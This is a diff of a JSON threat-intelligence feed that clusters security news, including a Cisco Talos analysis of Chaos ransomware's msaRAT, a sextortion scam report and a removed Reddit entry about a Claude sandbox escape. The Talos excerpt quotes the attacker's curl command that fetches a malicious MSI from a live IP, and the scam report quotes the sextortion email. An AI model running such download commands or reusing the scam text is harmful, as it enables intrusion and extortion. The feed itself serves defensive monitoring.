+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Google Cloud Threat Intelligence",
+          "cohort": "threat_research_primary",
+          "title": "Updated Cyber Threat Actor Naming System",
+          "link": "https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/",
+          "published": "2026-07-24T14:00:00+00:00",
+          "summary": "Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [
+              "APT1"
+            ],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Google Cloud Security",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "Updated Cyber Threat Actor Naming System",
+          "link": "https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/",
+          "published": "2026-07-24T14:00:00+00:00",
+          "summary": "Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [
+              "APT1"
+            ],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "3574a7b873",
       "priority_score": 21,
-      "member_count": 8,
-      "corroborating_source_count": 8,
+      "member_count": 7,
+      "corroborating_source_count": 7,
       "strong_signals": [
         "Anthropic/Claude"
       ],
@@ -1630,9 +1597,7 @@
           "Google Cloud"
         ],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-46331"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
@@ -1642,8 +1607,7 @@
         "confidence_tier": [
           "tier_1_primary_research",
           "tier_2_operator",
-          "tier_4_news",
-          "tier_5_chatter"
+          "tier_4_news"
         ]
       },
       "primary": {
@@ -1761,36 +1725,6 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "Anthropic/Claude": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Reddit r/netsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "Escaping Claude Cowork’s local VM sandbox via CVE-2026-46331",
-          "link": "https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/",
-          "published": "2026-07-24T05:53:48+00:00",
-          "summary": "submitted by /u/natcoba [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Anthropic/Claude"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-46331"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_5_chatter",
             "role_map": {
               "Anthropic/Claude": "target"
             },
@@ -3287,6 +3221,95 @@
       ]
     },
     {
+      "cluster_id": "07c378186b",
+      "priority_score": 12,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "ShinyHunters"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "ShinyHunters"
+        ],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "BleepingComputer",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "ShinyHunters data leaks fuel $2,000 sextortion email scam",
+        "link": "https://www.bleepingcomputer.com/news/security/shinyhunters-data-leaks-fuel-2-000-sextortion-email-scam/",
+        "published": "2026-07-25T14:16:26+00:00",
+        "summary": "Threat actors are using email addresses exposed in data breaches leaked by the ShinyHunters extortion group to send sextortion emails demanding $2,000 in Bitcoin. [...]",
+        "full_body": "ShinyHunters data leaks fuel $2,000 sextortion email scam By Lawrence Abrams July 25, 2026 10:16 AM 0 Threat actors are using email addresses exposed in data breaches leaked by the ShinyHunters extortion group to send sextortion emails demanding $2,000 in Bitcoin. The emails claim to come from ShinyHunters and tell recipients that hackers compromised their devices after obtaining their email addresses from breached company databases. However, the messages appear to be sent by someone who downloaded data previously leaked by ShinyHunters rather than by the extortion group itself, using the exposed email addresses to make the threats appear more legitimate. BleepingComputer has seen leaked data from the Amtrak, Hallmark, Substack, Betterment, CarGurus, ADT, Panera Bread, and McGraw Hill breaches used in this sextortion email campaign. For some recipients, BleepingComputer confirmed that the email addresses targeted by the sextortion emails were actually included in the associated data previously leaked by ShinyHunters. Extortion gangs often warn victims that refusing to pay will expose their customers and employees to additional abuse once stolen data is published. While those claims are intended to pressure organizations into paying, this campaign illustrates how leaked data can later be repurposed by unrelated threat actors for malicious purposes. While the use of a recipient's leaked email address may make these emails appear more convincing, there is no indication that the sender compromised recipients' devices, installed malware, accessed their cameras, or monitored their activity on adult websites. BleepingComputer contacted the ShinyHunters extortion group, which denied any involvement in the sextortion email campaign. Fake ShinyHunters sextortion emails In the emails seen by BleepingComputer, they are sent from random email addresses using the names \"ShinyHunters\" or \"You've Been HACKED\" and have the subject \"Information about your online security.\" The messages claim to be from the ShinyHunters hacking group and state that the attackers gained access to the recipient's devices several months earlier. The sender then names a company whose data was previously published by ShinyHunters, claiming that the breach allowed them to access the recipient's email account. We are the ShinyHunters hacking group. A few months ago, we gained access to your devices and started monitoring your online activities. What happened: We gained access to the Cargurus.com database where you have an account and easily accessed your email. You weren't very careful about the links you opened. A week later, we installed an exploit on your devices, including your phone, giving us access to your microphone, camera, keyboard, and all your data. We have your photos, browsing history, conversations, and contact list. Sextortion email claiming to be from the ShinyHunters extortion group Source: BleepingComputer The email falsely claims that the attackers later \"installed an exploit\" on the victim's computers and phones, allowing them to access the microphone, camera, keyboard, photos, browsing history, conversations, and contact list. The sender then claims to have recorded the recipient visiting adult websites and threatens to share intimate videos with their friends, colleagues, and family. To prevent the alleged release of these compromising videos, the victim is told to send $2,000 in Bitcoin within 48 hours. The email also warns recipients not to contact police, reply to the message, or reset their devices, claiming that the stolen information is stored on remote servers. These types of emails are known as \" sextortion \" emails and are designed to frighten recipients into paying a demand out of worry that they will have their reputation hurt with friends, family, and work colleagues. However, there is nothing to indicate that the sender ever had access to the recipients' devices or personal activity. Instead, the attackers use details from published ",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
+          "actor_attribution": [
+            "ShinyHunters"
+          ],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "ShinyHunters data leaks fuel $2,000 sextortion email scam",
+          "link": "https://www.bleepingcomputer.com/news/security/shinyhunters-data-leaks-fuel-2-000-sextortion-email-scam/",
+          "published": "2026-07-25T14:16:26+00:00",
+          "summary": "Threat actors are using email addresses exposed in data breaches leaked by the ShinyHunters extortion group to send sextortion emails demanding $2,000 in Bitcoin. [...]",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [
+              "ShinyHunters"
+            ],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "b788e3a84d",
       "priority_score": 12,
       "member_count": 1,
@@ -3552,87 +3575,6 @@
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "intel_roundup",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "542fdf33c7",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "telecommunications"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Citizen Lab",
-        "cohort": "threat_research_primary",
-        "title": "How Iran Uses Cellular Infrastructure to Target US Military Phones",
-        "link": "https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/",
-        "published": "2026-07-24T14:48:59+00:00",
-        "summary": "Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .",
-        "full_body": "Date Published July 24, 2026 Topics Targeted Surveillance telecommunications Mentions Gary Miller Share Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. He also discussed a recent Citizen Lab report about commercial surveillance vendors using the global telecom interconnect ecosystem to track targets. While SS7 attacks have been covered by the media for fifteen years, they are still taking place. “The fact it is still happening is telling…there’s a significant security problem within the mobile operator industry,” Miller says. Watch here More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media US Military Smartphones Targeted Through Roaming and Ad Tech JULY 17, 2026 News + Updates → In the Media WhatsApp Accuses NSO of Fresh Pegasus Targeting JUNE 19, 2026 News + Updates → In the Media How Freedom Tech Is Pushing Back Against Digital Authoritarianism JUNE 17, 2026",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [
-            "telecommunications"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Citizen Lab",
-          "cohort": "threat_research_primary",
-          "title": "How Iran Uses Cellular Infrastructure to Target US Military Phones",
-          "link": "https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/",
-          "published": "2026-07-24T14:48:59+00:00",
-          "summary": "Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [
-              "telecommunications"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
             "role_map": {},
             "weak_tags": {
@@ -3969,6 +3911,93 @@
       ]
     },
     {
+      "cluster_id": "de2a131113",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "legal_professional"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Microsoft Security Blog",
+        "cohort": "threat_research_primary",
+        "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
+        "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
+        "published": "2026-07-22T16:00:00+00:00",
+        "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
+        "full_body": "Share Link copied to clipboard! Cyber incidents don’t wait—and effective response can’t either. In the age of AI where cyber incidents unfold at machine speed, having the right partnerships in place becomes paramount. While AI is expanding what’s possible, navigating this transformation can be challenging to do alone. That’s why our collaboration with AXA XL is so important—bringing Microsoft Defender Experts Cybersecurity Incident Response services directly to cyber insurance policyholders at the moment it matters most, helping organizations coordinate technical, business, and insurance decisions in parallel rather than in sequence. Get started with Microsoft Defender Experts Cybersecurity Incident Response This collaboration reflects Microsoft’s continued investment in building an incident response model designed for real-world conditions, where speed, trust, and alignment matter as much as technology. In a live incident, security, executive, legal, and insurance teams are all acting at once. Without pre-established coordination, those parallel efforts can slow containment and increase risk. Our approach to incident response—and our work with AXA XL —starts by aligning those paths before a crisis begins. For example, during a ransomware incident, security teams may be actively containing lateral movement while leadership evaluates operational impact, legal teams assess disclosure requirements, and insurers determine coverage pathways—all within the same window of time. When those decisions aren’t aligned, response slows and risk compounds. Decades of supporting customers through high-stakes cyber incidents have reinforced a clear truth: effective incident response extends beyond technical execution. It requires coordination across teams and partners before the crisis hits. That experience continues to shape how we design Defender Experts Cybersecurity Incident Response—and how we work with partners like AXA XL. Incident response must extend beyond technology As a global insurance provider, AXA XL plays a critical role in helping organizations navigate cyber risk and response. Through this collaboration, AXA XL policyholders gain coordinated access to Microsoft’s dedicated incident response teams—combining threat containment, restoration, and recovery with insurance, legal, and regulatory workflows. By aligning AXA XL’s cyber insurance capabilities with Defender Experts Cybersecurity Incident Response, organizations benefit from a more integrated response model while gaining access to incident response teams informed by Microsoft Threat Intelligence and two decades of experience responding to some of the world’s most complex and consequential cyber incidents. Previously, organizations often brought incident responders and insurers together in the middle of a crisis. With this collaboration, that relationship is already in place, reducing friction, delays, and uncertainty when time is most critical. AXA XL policyholders and Microsoft customers can now bring Defender Experts Cybersecurity Incident Response to the table the moment it matters—creating a clearer, more predictable path from detection to recovery. The outcome is not simply faster response, but confidence: knowing who to call, how response engages, and how recovery is operationalized before the next decision becomes urgent. The threat of a cybersecurity incident has long been ‘not if, but when,’ and in the wake of AI, the ‘when’ may quickly become ‘how often.’ The risks organizations are tasked with preventing and overcoming relative to cybersecurity and data privacy are growing exponentially. Partnering with experts can make all the difference where resilience in the face of adversity may be your only saving grace. AXA XL’s strategic partnerships with cyber incident response providers underscore our commitment to expertise, preparedness, and resilience. By drawing on a deep knowledge of internal expertise and external cyber specialists, we empower our insureds to re",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "legal_professional"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Microsoft Security Blog",
+          "cohort": "threat_research_primary",
+          "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
+          "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
+          "published": "2026-07-22T16:00:00+00:00",
+          "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "legal_professional"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "1ff0bf04bf",
       "priority_score": 10,
       "member_count": 1,
@@ -4194,18 +4223,16 @@
       ]
     },
     {
-      "cluster_id": "de2a131113",
+      "cluster_id": "542fdf33c7",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [
-          "legal_professional"
+          "telecommunications"
         ],
         "affected_products": [],
         "tools_used": [],
@@ -4220,21 +4247,19 @@
         ]
       },
       "primary": {
-        "source": "Microsoft Security Blog",
+        "source": "Citizen Lab",
         "cohort": "threat_research_primary",
-        "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
-        "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
-        "published": "2026-07-22T16:00:00+00:00",
-        "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
-        "full_body": "Share Link copied to clipboard! Cyber incidents don’t wait—and effective response can’t either. In the age of AI where cyber incidents unfold at machine speed, having the right partnerships in place becomes paramount. While AI is expanding what’s possible, navigating this transformation can be challenging to do alone. That’s why our collaboration with AXA XL is so important—bringing Microsoft Defender Experts Cybersecurity Incident Response services directly to cyber insurance policyholders at the moment it matters most, helping organizations coordinate technical, business, and insurance decisions in parallel rather than in sequence. Get started with Microsoft Defender Experts Cybersecurity Incident Response This collaboration reflects Microsoft’s continued investment in building an incident response model designed for real-world conditions, where speed, trust, and alignment matter as much as technology. In a live incident, security, executive, legal, and insurance teams are all acting at once. Without pre-established coordination, those parallel efforts can slow containment and increase risk. Our approach to incident response—and our work with AXA XL —starts by aligning those paths before a crisis begins. For example, during a ransomware incident, security teams may be actively containing lateral movement while leadership evaluates operational impact, legal teams assess disclosure requirements, and insurers determine coverage pathways—all within the same window of time. When those decisions aren’t aligned, response slows and risk compounds. Decades of supporting customers through high-stakes cyber incidents have reinforced a clear truth: effective incident response extends beyond technical execution. It requires coordination across teams and partners before the crisis hits. That experience continues to shape how we design Defender Experts Cybersecurity Incident Response—and how we work with partners like AXA XL. Incident response must extend beyond technology As a global insurance provider, AXA XL plays a critical role in helping organizations navigate cyber risk and response. Through this collaboration, AXA XL policyholders gain coordinated access to Microsoft’s dedicated incident response teams—combining threat containment, restoration, and recovery with insurance, legal, and regulatory workflows. By aligning AXA XL’s cyber insurance capabilities with Defender Experts Cybersecurity Incident Response, organizations benefit from a more integrated response model while gaining access to incident response teams informed by Microsoft Threat Intelligence and two decades of experience responding to some of the world’s most complex and consequential cyber incidents. Previously, organizations often brought incident responders and insurers together in the middle of a crisis. With this collaboration, that relationship is already in place, reducing friction, delays, and uncertainty when time is most critical. AXA XL policyholders and Microsoft customers can now bring Defender Experts Cybersecurity Incident Response to the table the moment it matters—creating a clearer, more predictable path from detection to recovery. The outcome is not simply faster response, but confidence: knowing who to call, how response engages, and how recovery is operationalized before the next decision becomes urgent. The threat of a cybersecurity incident has long been ‘not if, but when,’ and in the wake of AI, the ‘when’ may quickly become ‘how often.’ The risks organizations are tasked with preventing and overcoming relative to cybersecurity and data privacy are growing exponentially. Partnering with experts can make all the difference where resilience in the face of adversity may be your only saving grace. AXA XL’s strategic partnerships with cyber incident response providers underscore our commitment to expertise, preparedness, and resilience. By drawing on a deep knowledge of internal expertise and external cyber specialists, we empower our insureds to re",
+        "title": "How Iran Uses Cellular Infrastructure to Target US Military Phones",
+        "link": "https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/",
+        "published": "2026-07-24T14:48:59+00:00",
+        "summary": "Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .",
+        "full_body": "Date Published July 24, 2026 Topics Targeted Surveillance telecommunications Mentions Gary Miller Share Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. He also discussed a recent Citizen Lab report about commercial surveillance vendors using the global telecom interconnect ecosystem to track targets. While SS7 attacks have been covered by the media for fifteen years, they are still taking place. “The fact it is still happening is telling…there’s a significant security problem within the mobile operator industry,” Miller says. Watch here More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media US Military Smartphones Targeted Through Roaming and Ad Tech JULY 17, 2026 News + Updates → In the Media WhatsApp Accuses NSO of Fresh Pegasus Targeting JUNE 19, 2026 News + Updates → In the Media How Freedom Tech Is Pushing Back Against Digital Authoritarianism JUNE 17, 2026",
         "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion"
-          ],
+          "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [
-            "legal_professional"
+            "telecommunications"
           ],
           "affected_products": [],
           "tools_used": [],
@@ -4251,19 +4276,17 @@
       },
       "corroborating_sources": [
         {
-          "source": "Microsoft Security Blog",
+          "source": "Citizen Lab",
           "cohort": "threat_research_primary",
-          "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
-          "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
-          "published": "2026-07-22T16:00:00+00:00",
-          "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
+          "title": "How Iran Uses Cellular Infrastructure to Target US Military Phones",
+          "link": "https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/",
+          "published": "2026-07-24T14:48:59+00:00",
+          "summary": "Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .",
           "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion"
-            ],
+            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [
-              "legal_professional"
+              "telecommunications"
             ],
             "affected_products": [],
             "tools_used": [],
@@ -4273,6 +4296,252 @@
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
             "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "a1940e8772",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Cisco"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Cisco Talos",
+        "cohort": "threat_research_primary",
+        "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
+        "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
+        "published": "2026-07-23T10:00:38+00:00",
+        "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
+        "full_body": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\\programdata\\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Cisco"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Cisco": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Cisco Talos",
+          "cohort": "threat_research_primary",
+          "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
+          "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
+          "published": "2026-07-23T10:00:38+00:00",
